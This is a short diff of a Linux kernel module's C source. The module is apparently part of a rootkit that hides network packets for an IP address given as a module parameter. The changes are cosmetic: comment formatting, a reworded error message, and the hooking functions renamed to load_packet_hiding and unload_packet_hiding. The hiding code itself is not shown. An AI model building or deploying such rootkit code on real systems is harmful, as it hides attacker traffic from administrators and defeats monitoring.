@@ -8,12 +8,14 @@
 #include "hide_packet.h"
 #include "include.h"
 
-/* module parameter  
+/*
+ * module parameter  
  * To get the IP address, Input as string and parse it
  */
-
 static char input_ip[16]; 
 module_param_string(ipv4, input_ip, 16, 0);
+
+
 /*
  * Function called when loading the kernel module.
  * Prints a welcome-message and then does its magic.
@@ -28,14 +30,11 @@ int init_module (void)
 	
 	if(ret == 0)
 	{
-		ROOTKIT_DEBUG("Invalid IP address, Please enter valid IP\n");
+		ROOTKIT_DEBUG("Invalid IP-address. Please enter a valid address.\n");
 		return -EINVAL;
 	}
 	
-//	host_ip = *((unsigned int*)dst);
-//	ROOTKIT_DEBUG("the Ip address = %d.%d\n",host_ip,dst[1]);
-	
-	hook_packets(input_ip);
+	load_packet_hiding(input_ip);
 	
 	return 0;
 }
@@ -47,7 +46,7 @@ int init_module (void)
  */
 void cleanup_module (void)
 {
-	unhook_packets();
+	unload_packet_hiding();
 	
 	/* Finally, log the unloading */
 	ROOTKIT_DEBUG("Unloading packet-hider... bye!\n");
